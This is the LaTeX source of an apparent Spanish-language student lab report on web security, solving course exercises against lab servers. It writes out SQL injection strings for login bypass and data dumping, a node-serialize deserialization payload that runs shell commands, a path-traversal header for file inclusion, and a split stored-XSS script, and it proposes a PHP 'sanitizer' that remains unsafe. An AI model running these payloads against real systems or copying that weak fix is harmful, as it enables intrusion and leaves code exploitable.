%% LyX 2.3.5.2 created this file.  For more info, see http://www.lyx.org/.
%% Do not edit unless you really know what you are doing.
\documentclass[english]{article}
\usepackage[T1]{fontenc}
\usepackage[latin9]{inputenc}

\makeatletter
\@ifundefined{date}{}{\date{}}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% User specified LaTeX commands.
\usepackage{xcolor}
\usepackage{listings}
\lstset{basicstyle=\ttfamily,
  showstringspaces=false,
  commentstyle=\color{red},
  keywordstyle=\color{blue}
}

\makeatother

\usepackage{babel}
\begin{document}
\title{\underline{Pr�ctica 2 : Seguridad Web}}
\author{\underline{Alumno:Pablo Alonso}}
\maketitle

\subsection*{1)}

\subsection*{a-}

Al provocar un error en la consulta sql, por ejemplo con bob' UNION SELECT NULL,
se presenta un Traceback y al seleccionar una linea de c�digo accedemos
al c�digo fuente. Leyendo el c�digo fuente se inyecta el siguiente
fragmento de consulta para vulnerar el login ingresando lo siguiente
en el username:

\begin{lstlisting}[language=sql,caption={}]
dafd' UNION SELECT 1,
'ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb','' --
\end{lstlisting}

\medskip{}

En la password se ingresa solo 'a' y se accede al secreto de bob:
i have no secrets .

\subsection*{b-}

El servidor lanza una excepci�n si el user\_id devuelto por la consulta
no se trata de una clave en el diccionario que guarda los secretos,
en el cual se imprime el resultado de la consulta. Aprovechando eso,
se puede inyectar el siguiente c�digo a travez del username:

\begin{lstlisting}[language=sql,caption={}]
dfas' UNION SELECT 
(SELECT COUNT(id) FROM(users),
'ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb',
'' --
\end{lstlisting}

Nuevamente se ingresa 'a' como password y se imprime lo siguiente:
KeyError '6', 6 corresponde al resultado de la consulta SELECT COUNT(id)
FROM(users).

\subsection*{c-}

Aprovechando lo anterior, se inyecta:

\begin{lstlisting}[language=sql,caption={}]
asdf' UNION SELECT
(SELECT GROUP_CONCAT(username) FROM users), 
'ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb',''
\end{lstlisting}

Y surge una KeyError exception: KeyError: 'cacho,bob,john,mallory,eve,kisio'.

'cacho,bob,john,mallory,eve,kisio' corresponde al resultado de SELECT
GROUP\_CONCAT(username) FROM users.

\subsection*{2)}

\subsection*{a-}

Se utiliza Javascript del lado del servidor.

\subsection*{b-}

Al ingresar por primera vez el sitio no muestra nada interesante.
Si se refresca surge un error del tipo ``SyntaxError: Unexpected
token F in JSON at position 79 at JSON.parse''. Es decir que se est�
mandando informaci�n al servidor web en forma de objeto JSON y este
intenta deserializarlo para transformarlo en un objeto Javascript.
Al interceptar un paquete con Burp Suite se observa que el servidor
asigna una cookie al navegador. El token de la cookie es:

eyJ1c2VybmFtZSI6IkFkbWluIiwiY3NyZnRva2VuIjoidTMydDRvM3RiM2dnNDMxZn

MzNGdnZGdjaGp3bnphMGw9IiwiRXhwaXJlcz0iOkZyaWRheSwgMTMgT2N0IDIwM

TggMDA6MDA6MDAgR01UIn0\%3D.

Dado que '\%3D' es '=' encodeado en URL encoding se reemplaza y decodifica
en base64:

\{\textquotedbl username\textquotedbl :\textquotedbl Admin\textquotedbl ,\textquotedbl csrftoken\textquotedbl :\textquotedbl u32t4o3tb3gg431fs34ggdgchjwnza0l=\textquotedbl ,\textquotedbl Expires=\textquotedbl :Friday,
13 Oct 2018 00:00:00 GMT\textquotedbl\}

Observar que la falta de `` en Friday explica el error con el que
resonde el servidor. Esto da el indici� de que lo que se intenta deserializar
a objeto Javascript es el token decodificado que se pasa como Cookie.
Se codifica el siguiente JSON en base64 y se envia como cookie:

\{\textquotedbl username\textquotedbl :\textquotedbl Admin\textquotedbl ,\textquotedbl csrftoken\textquotedbl :\textquotedbl u32t4o3tb3gg431fs34ggdgchjwnza0l=\textquotedbl ,\textquotedbl Expires=\textquotedbl :\textquotedbl Friday,
13 Oct 2018 00:00:00 GMT\textquotedbl\}

La respuesta es ``Hello Admin'', es decir que dentro de la aplicaci�n
se invoca al atributo username.

\subsection*{c-}

Una forma de explotar la vulnerabilidad encontrada es pasar como valor
de username una funci�n que se termine ejecutando del lado del servidor,
para conseguir el token que vamos a pasar como cookie se ejecuta el
siguiente c�digo javascript:

\lstdefinelanguage{javascript}{   keywords={typeof, new, true, false, catch, function, return, null, catch, switch, var, if, in, while, do, else, case, break},   keywordstyle=\color{blue}\bfseries,   ndkeywords={class, export, boolean, throw, implements, import, this},   ndkeywordstyle=\color{darkgray}\bfseries,   identifierstyle=\color{black},   sensitive=false,   comment=[l]{//},   morecomment=[s]{/*}{*/},   commentstyle=\color{purple}\ttfamily,   stringstyle=\color{red}\ttfamily,   morestring=[b]',   morestring=[b]" }
\lstset{    language=JavaScript,    backgroundcolor=\color{lightgray},    extendedchars=true,    basicstyle=\footnotesize\ttfamily,    showstringspaces=false,    showspaces=false,    numbers=none,    numberstyle=\footnotesize,    numbersep=9pt,    tabsize=2,    breaklines=true,    showtabs=false,    captionpos=b } 
\begin{lstlisting}[language=javaScript,caption={}]
var comm = 'cat server.js'
var y = {	
    username: function(){
          var execSync = require('child_process').execSync;
          return execSync(comm, { encoding: 'utf-8' });
    },
      
}
var serialize = require('node-serialize'); 
console.log("Serialized:" + serialize.serialize(y));
\end{lstlisting}

Obtenemos el siguiente JSON:

\{``username'': \textquotedbl\_\$\$ND\_FUNC\$\$\_function ()\{
var execSync = require('child\_process').execSync;return execSync('cat
server.js', \{ encoding: 'utf-8' \}) \}()\textquotedbl{} \}

Se encodea en base64 y se lo agrega como cookie. Luego cuando la aplicaci�n
procesa esta request termina ejecutando el comando pasado.

\subsection*{3)}

\subsection*{a- }

La apicaci�n es vulnerable a sql injection a tr�vez del par�metro
id que se pasa por GET. Esto es comprobable al percibir respuestas
distintas al agregar junto con el id fragmentos de consultas del tipo
and o union.

\subsection*{b-}

Se puede obtener el c�digo de la aplicaci�n ya que la consulta que
se realiza con el par�metro id retorna la ruta del archivo. Entonces
mandando ``id=9 UNION SELECT alguna\_ruta'' se puede leer cualquier
contenido dentro de la aplicaci�n. El �nico problema es que no se
conoce los nombres de los archivos de la aplicaci�n entonces hacemos
uso de la tool intruder de BurpSuite para hacer un ataque por diccionario
hasta dar con el nombre de alg�n archivo dentro de la aplicaci�n.
Finalmente se logra dar con main.py y se encuentra la FLAG:''SEGURIDAD-OFENSIVA-FAMAF''.

\subsection*{4)}

\subsection*{a-}

Usando Burp Suite, podr�amos capturar una request como esta:

GET / HTTP/1.1

Host: 143.0.100.198:5010 

User-Agent: Mozilla/5.0 (X11; Linux x86\_64; rv:68.0) Gecko/20100101
Firefox/68.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,{*}/{*};q=0.8 

Accept-Language: en-US,en;q=0.5 

Accept-Encoding: gzip, deflate

Connection: close

Upgrade-Insecure-Requests: 1

Cache-Control: max-age=0 

\medskip{}

Y modificarla de la siguiente manera:

\medskip{}

GET / HTTP/1.1

Host: 143.0.100.198:5010 

User-Agent: Mozilla/5.0 (X11; Linux x86\_64; rv:68.0) Gecko/20100101
Firefox/68.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,{*}/{*};q=0.8 

Accept-Language: ....//what\_i\_want

Accept-Encoding: gzip, deflate

Connection: close

Upgrade-Insecure-Requests: 1

Cache-Control: max-age=0 

\medskip{}

Basta reemplazar what\_i\_want para escaparse de la carpeta lang e
incluir otros archivos locales del servidor dentro del script. 

\medskip{}


\subsection*{b-}

Un script mas adecuado seria:

\lstset{   language        = php,   basicstyle      = \small\ttfamily,   keywordstyle    = \color{dkblue},   stringstyle     = \color{red},   identifierstyle = \color{dkgreen},   commentstyle    = \color{gray},   emph            =[1]{php},   emphstyle       =[1]\color{black},   emph            =[2]{if,and,or,else},   emphstyle       =[2]\color{dkyellow}}
\lstset{    language=php,    backgroundcolor=\color{lightgray},    extendedchars=true,    basicstyle=\footnotesize\ttfamily,    showstringspaces=false,    showspaces=false,    numbers=none,    numberstyle=\footnotesize,    numbersep=9pt,    tabsize=2,    breaklines=true,    showtabs=false,    captionpos=b } 
\begin{lstlisting}[language=javaScript,caption={}]
<?php class LangMgr{ 
       public function newLang(){ 
            $lang = $this->getBrowserLang();
            $sanitizedLang = $this->sanitizeLang($lang);
            require_once("/lang/$sanitizedLang");
       }

       private function getBrowserLang(){
            $lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'en';
            return $lang;
       }

      private function sanitizeLang($lang){
            return substr($lang,2);
      }
}

(new LangMgr())->newLang(); ?>
\end{lstlisting}

\subsection*{5)}

El tipo de ataque que se lleva a cabo sobre la m�quina owaspbwa es
del tipo XSS Stored. Se observa que una base de tados almacena el
nombre y el mensaje ingresados y que la aplicaci�n los agrega en el
html de respuesta tal cual se ingresan. La idea es insertar un script
como el que se describe a continuaci�n:

\lstdefinelanguage{javascript}{   keywords={typeof, new, true, false, catch, function, return, null, catch, switch, var, if, in, while, do, else, case, break},   keywordstyle=\color{blue}\bfseries,   ndkeywords={class, export, boolean, throw, implements, import, this},   ndkeywordstyle=\color{darkgray}\bfseries,   identifierstyle=\color{black},   sensitive=false,   comment=[l]{//},   morecomment=[s]{/*}{*/},   commentstyle=\color{purple}\ttfamily,   stringstyle=\color{red}\ttfamily,   morestring=[b]',   morestring=[b]" }
\lstset{    language=JavaScript,    backgroundcolor=\color{lightgray},    extendedchars=true,    basicstyle=\footnotesize\ttfamily,    showstringspaces=false,    showspaces=false,    numbers=none,    numberstyle=\footnotesize,    numbersep=9pt,    tabsize=2,    breaklines=true,    showtabs=false,    captionpos=b } 
\begin{lstlisting}[language=javaScript,caption={}]
<script>
var i = 0;
document.getElementsByTagName("textarea")[0].onkeypress=function(){
alert(i);i++;};
</script>
\end{lstlisting}

Dado que el textarea que ofrece el sitio acepta una peque�a cantidad
de car�cteres, se hace uso de los comentarios para trozar el script
en peque�os fragmentos y poder ingresarlo al sistema de la aplicaci�n.
Entonces se ingresan nombres y mensajes como los que siguen:

\medskip{}

nombre:1

mensaje:<script>/{*}

\medskip{}

nombre:2

mensaje:{*}/var i = 0;/{*}

\medskip{}

nombre:3

mensaje:{*}/document./{*}

\medskip{}

nombre:4

mensaje:{*}/getElementsByTagName(\textquotedbl textarea\textquotedbl ){[}0{]}/{*}

\medskip{}

nombre:5

mensaje:{*}/.onkeypress=function()/{*}

\medskip{}

nombre:6

mensaje:{*}/\{alert(i);i++;\};/{*}

\medskip{}

nombre:7

mensaje:{*}/</script>

\medskip{}

Y se logra capturar el evento de que el usuario de la aplicaci�n pulse
una tecla.

\subsection*{6)}

\subsection*{a-}

Flag:ThIs\_Even\_PaSsED\_c0d3\_rewVIEW

\subsection*{b-}

Se observa en el header server que la tecnolog�a que se usa en el
servidor web es Werkzeug 0.10.4. Investigando esta tecnolog�a se descubre
que el debuguer permite abrir una consola python en la aplicaci�n
web la cu�l puede ejecutar codigo arbitrario dentro del contexto de
la aplicaci�n web. Invocamos dicha consola en http://143.0.100.198:5001/console
. Una vez dentro de la consola observamos la siguiente linea de c�digo:

\begin{lstlisting}[language=python,caption={}]
 app.run(debug=True, host="0.0.0.0", port=1337)
\end{lstlisting}

En resumen, el error es que se esta corriendo la aplicaci�n web dentro
de un servidor de producci�n con la bandera de debug encencida y esto
habilita una consola dentro de la aplicaci�n disponible para cualquier
intruso.

Otra alternativa para encontrar esta vulnerabilidad es con dirbuster.
\end{document}
